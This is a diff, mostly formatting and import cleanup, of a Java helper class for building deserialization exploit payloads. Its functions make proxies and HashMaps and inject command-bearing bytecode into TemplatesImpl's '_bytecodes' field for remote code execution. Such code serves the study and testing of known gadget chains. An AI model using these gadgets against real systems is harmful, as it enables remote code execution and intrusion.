@@ -29,10 +29,9 @@ import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
 import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
 import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
 import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
-import javassist.ClassClassPath;
-import javassist.ClassPool;
-import javassist.CtClass;
+import javassist.*;
 
+import java.io.IOException;
 import java.io.Serializable;
 import java.lang.reflect.*;
 import java.util.HashMap;
@@ -44,9 +43,9 @@ import static com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.DESERIA
 /*
  * utility generator functions for common jdk-only gadgets
  */
-@SuppressWarnings ( {
+@SuppressWarnings({
     "rawtypes", "unchecked"
-} )
+})
 public class Gadgets {
 
   static {
@@ -65,11 +64,11 @@ public class Gadgets {
 
 
     @Override
-    public void transform (DOM document, SerializationHandler[] handlers ) { /* empty block */ }
+    public void transform(DOM document, SerializationHandler[] handlers) { /* empty block */ }
 
 
     @Override
-    public void transform (DOM document, DTMAxisIterator iterator, SerializationHandler handler ) { /* empty block */ }
+    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) { /* empty block */ }
   }
 
   // required to make TemplatesImpl happy
@@ -77,32 +76,34 @@ public class Gadgets {
     private static final long serialVersionUID = 8207363842866235160L;
   }
 
-  public static <T> T createMemoitizedProxy ( final Map<String, Object> map, final Class<T> iface, final Class<?>... ifaces ) throws Exception {
+  public static <T> T createMemoitizedProxy(final Map<String, Object> map, final Class<T> iface, final Class<?>... ifaces) throws Exception {
     return createProxy(createMemoizedInvocationHandler(map), iface, ifaces);
   }
 
-  public static InvocationHandler createMemoizedInvocationHandler (final Map<String, Object> map) throws Exception {
+  public static InvocationHandler createMemoizedInvocationHandler(final Map<String, Object> map) throws Exception {
     return (InvocationHandler) Reflections.getFirstCtor(ANN_INV_HANDLER_CLASS).newInstance(Override.class, map);
   }
 
-  public static <T> T createProxy ( final InvocationHandler ih, final Class<T> iface, final Class<?>... ifaces ) {
+  public static <T> T createProxy(final InvocationHandler ih, final Class<T> iface, final Class<?>... ifaces) {
     final Class<?>[] allIfaces = (Class<?>[]) Array.newInstance(Class.class, ifaces.length + 1);
-    allIfaces[ 0 ] = iface;
-    if ( ifaces.length > 0 ) {
+    allIfaces[0] = iface;
+    if (ifaces.length > 0) {
       System.arraycopy(ifaces, 0, allIfaces, 1, ifaces.length);
     }
     return iface.cast(Proxy.newProxyInstance(Gadgets.class.getClassLoader(), allIfaces, ih));
   }
 
-  public static Map<String, Object> createMap ( final String key, final Object val ) {
+  public static Map<String, Object> createMap(final String key, final Object val) {
     final Map<String, Object> map = new HashMap<>();
     map.put(key, val);
     return map;
   }
 
 
-  public static Object createTemplatesImpl ( final String command ) throws Exception {
-    if ( Boolean.parseBoolean(System.getProperty("properXalan", "false")) ) {
+  public static Object createTemplatesImpl(final String command)
+      throws IllegalAccessException, InstantiationException, NotFoundException, CannotCompileException,
+      IOException, ClassNotFoundException, NoSuchFieldException {
+    if (Boolean.parseBoolean(System.getProperty("properXalan", "false"))) {
       return createTemplatesImpl(
           command,
           Class.forName("org.apache.xalan.xsltc.trax.TemplatesImpl"),
@@ -114,8 +115,8 @@ public class Gadgets {
   }
 
 
-  public static <T> T createTemplatesImpl ( final String command, Class<T> tplClass, Class<?> abstTranslet, Class<?> transFactory )
-      throws Exception {
+  public static <T> T createTemplatesImpl(final String command, Class<T> tplClass, Class<?> abstTranslet, Class<?> transFactory)
+      throws IllegalAccessException, InstantiationException, NotFoundException, CannotCompileException, IOException, NoSuchFieldException {
     final T templates = tplClass.newInstance();
 
     // use template gadget class
@@ -134,7 +135,7 @@ public class Gadgets {
     final byte[] classBytes = clazz.toBytecode();
 
     // inject class bytes into instance
-    Reflections.setFieldValue(templates, "_bytecodes", new byte[][] {
+    Reflections.setFieldValue(templates, "_bytecodes", new byte[][]{
         classBytes, ClassFiles.classAsBytes(Foo.class)
     });
 
@@ -145,14 +146,13 @@ public class Gadgets {
   }
 
 
-  public static HashMap makeMap ( Object v1, Object v2 ) throws Exception {
+  public static HashMap makeMap(Object v1, Object v2) throws Exception {
     HashMap s = new HashMap();
     Reflections.setFieldValue(s, "size", 2);
     Class nodeC;
     try {
       nodeC = Class.forName("java.util.HashMap$Node");
-    }
-    catch (@SuppressWarnings("unused") ClassNotFoundException e ) {
+    } catch (@SuppressWarnings("unused") ClassNotFoundException e) {
       nodeC = Class.forName("java.util.HashMap$Entry");
     }
     Constructor nodeCons = nodeC.getDeclaredConstructor(int.class, Object.class, Object.class, nodeC);
